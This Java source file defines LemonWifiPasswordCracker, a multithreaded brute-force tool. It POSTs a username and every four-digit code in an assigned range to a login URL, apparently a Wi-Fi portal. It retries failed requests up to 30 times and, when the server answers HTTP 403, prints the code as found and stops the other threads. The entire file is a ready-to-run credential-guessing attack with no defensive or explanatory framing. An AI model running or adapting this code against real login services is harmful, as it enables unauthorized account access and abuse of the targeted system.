package cn.xiaohai.xlemonwifi.utility;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class LemonWifiPasswordCracker implements Runnable {

    private final AtomicReference<String> foundPassword;
    private final String url;
    private final String username;
    private final int start;
    private final int end;
    private final AtomicBoolean stopFlag;

    public LemonWifiPasswordCracker(String url, String username, int start, int end, AtomicReference<String> foundPassword, AtomicBoolean stopFlag) {
        this.url = url;
        this.username = username;
        this.start = start;
        this.end = end;
        this.foundPassword = foundPassword;
        this.stopFlag = stopFlag;
    }

    @Override
    public void run() {
        for (int num = start; num <= end && !stopFlag.get(); num++) {
            String password = String.format("%04d", num);

            boolean success = false;
            int retryCount = 0;
            while (!success && retryCount < 30) {
                try {
                    URL obj = new URL(url);
                    HttpURLConnection con = (HttpURLConnection) obj.openConnection();

                    con.setRequestMethod("POST");
                    con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String urlParameters = "username=" + username + "&password=" + password;
                    con.setDoOutput(true);
                    try (OutputStream os = con.getOutputStream()) {
                        os.write(urlParameters.getBytes());
                        os.flush();
                    }

                    int responseCode = con.getResponseCode();
                    if (responseCode == 403) {
                        System.out.println("找到验证码: " + password);
                        foundPassword.set(password);
                        stopFlag.set(true);
                        return;
                    }

                    try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
                        String inputLine;
                        StringBuilder response = new StringBuilder();
                        while ((inputLine = in.readLine()) != null) {
                            response.append(inputLine);
                        }
                    }
                    success = true;
                } catch (Exception e) {
                    retryCount++;
                }
            }
        }
    }

    public String getFoundPassword() {
        return foundPassword.get();
    }

}
